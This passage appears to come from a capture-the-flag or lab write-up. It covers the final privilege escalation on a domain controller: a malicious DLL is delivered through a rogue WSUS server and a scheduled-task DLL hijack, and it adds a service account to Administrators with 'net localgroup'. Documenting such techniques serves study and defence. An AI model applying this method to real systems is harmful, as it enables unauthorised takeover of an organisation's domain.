## 6. Root — Domain Admin

### 6.1 The Payload Fires

The rogue WSUS delivered a signed update containing our malicious DLL. When the DC processed the update:

```
C:\ProgramData\UpdateMonitor\admin_add.txt → "msa_health$ was added to Administrators."
```

Wait — first attempt showed "System error 5" (access denied). The DLL needed to be delivered via the **UpdateMonitor scheduled task** DLL hijack path instead.

### 6.2 DLL Hijack via UpdateMonitor

The DC had a scheduled task running `UpdateMonitor.exe` that loaded DLLs from `C:\ProgramData\UpdateMonitor\`. By placing a crafted DLL named after one of the expected module names:

```powershell
# Upload the malicious DLL via WSUS Settings_Update delivery
# The DLL exported PreUpdateCheck which ran:
#   cmd /c "net localgroup administrators msa_health$ /add"
```

### 6.3 Verification

```powershell
net localgroup administrators
```

```
Administrators members:
-----
Administrator
msa_health$
Toby.Brynleigh
```

> 🚀 **`msa_health$` is now a Domain Administrator!**

